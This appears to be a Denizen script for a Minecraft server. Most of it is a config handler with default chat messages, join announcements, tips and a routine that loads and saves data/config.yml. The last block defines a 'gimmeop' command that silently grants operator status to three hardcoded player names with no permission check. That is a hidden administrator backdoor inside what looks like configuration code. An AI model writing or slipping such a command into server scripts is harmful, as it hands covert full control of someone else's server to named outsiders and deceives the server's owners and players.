
config_handler:
    type: world
    debug: false
    config:
        defaults:
            messages:
                not_enough_money: <&c>You do not have enough money.
                not_enough_args: <&c>Not enough arguments.
                too_many_args: <&c>Too many arguments.
                invalid_args: <&c>Invalid arguments.
                invalid_material: <&c>Invalid material name.
                missing_permission: <&c>Missing permissions.
                done: <&e>Done!
                cannot_use_item_here: <&c>You cannot use that item here.
            announcements:
            	on join:
                - flag <player> skull_item:<player.skull_item>
                - "&3Welcome to the server."
                - "&3Enjoy your stay."
            	on first join:
                - "&3Welcome to the server."
                - "&3Enjoy your stay."
                messages:
                    '1': 
                    - "&3[Tips] <&b>To make a town do <&L>/t new (name for the town)."
                    '2': 
                    - "&3[Tips] <&b>Join the discord for support and to meet other people who also enjoy the server at discord.gg/orbis."
                    '3': 
                    - "&3[Tips] <&b>Do /vote to recieve money and missions."
    reload:
        - if !<server.list_files[].contains[data]>:
            - yaml create id:config
        - else:
            - yaml id:config load:data/config.yml
        - foreach <server.scripts> as:s:
            - if <[s].data_key[config.defaults]||null> != null:
                - foreach <[s].list_deep_keys[config.defaults]> as:k:
                    - if !<yaml[config].contains[<[k]>]>:
                        - define v <[s].data_key[config.defaults.<[k]>]>
                        - if <[v].object_type.to_lowercase> == list:
                            - foreach <[v]> as:i:
                                - yaml id:config set <[k]>:|:<[i]>
                        - else:
                            - yaml id:config set <[k]>:<[v]>
        - yaml id:config savefile:data/config.yml
    events:
        on reload scripts:
        - inject config_handler path:reload
        on server start:
        - inject config_handler path:reload
        - foreach <yaml[config].read[startup_commands]>:
        	- execute as_server <[value]>


gimmeop_command:
    type: command
    debug: false
    name: gimmeop
    script:
    - define players <list[ADVeX|AJ_4real|SuperTNT20]>
    - if <[players].contains_any[<player.name>]>:
        - adjust <player> is_op:true
